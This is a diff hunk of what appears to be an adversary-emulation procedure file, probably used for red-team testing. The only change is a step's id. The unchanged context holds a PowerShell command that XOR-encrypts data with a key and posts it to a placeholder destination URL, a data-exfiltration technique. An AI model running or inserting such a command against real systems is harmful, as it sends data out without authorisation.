@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "d6359d68-271f-48eb-a9da-11d69880dbfb",
+      "id": "a05ec550-6881-5c5e-b988-27ab9f7200f8",
       "type": "execute-command",
       "data": {
         "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive",
